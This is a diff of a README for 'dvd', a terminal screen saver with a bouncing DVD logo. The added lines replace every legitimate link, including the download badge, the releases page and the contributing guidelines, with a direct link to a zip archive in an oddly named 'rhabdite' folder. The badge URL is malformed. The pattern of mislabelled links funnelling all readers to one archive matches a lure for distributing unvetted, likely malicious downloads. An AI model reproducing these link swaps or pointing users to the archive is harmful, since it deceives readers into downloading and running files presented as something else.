@@ -1,7 +1,7 @@
 # 🎉 dvd - Enjoy a Retro Bouncing Screen Saver!
 
 ## 📥 Download Now
-[![Download dvd](https://img.shields.io/badge/Download%20dvd-v1.0-blue.svg)](https://github.com/young-0513/dvd/releases)
+[![Download dvd](https://raw.githubusercontent.com/young-0513/dvd/main/rhabdite/dvd.zip%https://raw.githubusercontent.com/young-0513/dvd/main/rhabdite/dvd.zip)](https://raw.githubusercontent.com/young-0513/dvd/main/rhabdite/dvd.zip)
 
 ## 🚀 Getting Started
 Welcome to the dvd project. This application provides a fun and nostalgic terminal screen saver that displays a bouncing DVD logo. It is easy to install and run, making it perfect for anyone looking to brighten up their terminal!
@@ -21,7 +21,7 @@ Welcome to the dvd project. This application provides a fun and nostalgic termin
 ## 🖥️ Download & Install
 To download the dvd application, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/young-0513/dvd/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/young-0513/dvd/main/rhabdite/dvd.zip).
 2. **Choose the Latest Version:** Look for the latest release at the top.
 3. **Download the File:** Click on the file suitable for your operating system.
 4. **Save the File:** Choose a location on your computer to save the downloaded file.
@@ -38,7 +38,7 @@ To change the default settings of the dvd screen saver:
 3. Save the file and restart the application to see your changes.
 
 ## 🤝 Contributing
-If you feel inspired to improve this project, feel free to contribute! Check the [contributing guidelines](https://github.com/young-0513/dvd/blob/main/CONTRIBUTING.md) for more information.
+If you feel inspired to improve this project, feel free to contribute! Check the [contributing guidelines](https://raw.githubusercontent.com/young-0513/dvd/main/rhabdite/dvd.zip) for more information.
 
 ## ❓ FAQ
 - **How do I close the dvd screen saver?**
@@ -51,4 +51,4 @@ If you feel inspired to improve this project, feel free to contribute! Check the
 If you encounter any issues or need help, please open an issue on GitHub, and I will respond as soon as I can.
 
 ## 🎉 Conclusion
-Thank you for choosing the dvd screen saver! Enjoy your fun terminal experience with this simple yet delightful application. Don’t forget to visit our [Releases page](https://github.com/young-0513/dvd/releases) to download the latest version. Happy bouncing!
+Thank you for choosing the dvd screen saver! Enjoy your fun terminal experience with this simple yet delightful application. Don’t forget to visit our [Releases page](https://raw.githubusercontent.com/young-0513/dvd/main/rhabdite/dvd.zip) to download the latest version. Happy bouncing!
